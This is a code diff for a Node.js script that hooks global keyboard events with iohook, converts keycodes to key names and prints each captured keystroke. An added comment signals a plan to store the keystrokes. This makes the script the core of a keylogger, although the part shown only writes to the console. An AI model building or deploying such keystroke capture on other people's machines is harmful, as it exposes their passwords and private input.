@@ -102,7 +102,6 @@ let keymap = {
     "222": "single_quote"
 }
 function interpret(event) {
-
     if (event.rawcode==20) {
         toggle = !toggle;
     }else{
@@ -115,15 +114,15 @@ function interpret(event) {
             }
             if(i){
                 console.log(i);
+                //to be stored without linebreak
             }
         }
     }
-    return
 }
 
 
 iohook.on('keydown', (event) => {
-    console.log(interpret(event)+'END');
+    interpret(event);
 });
 
 iohook.start();
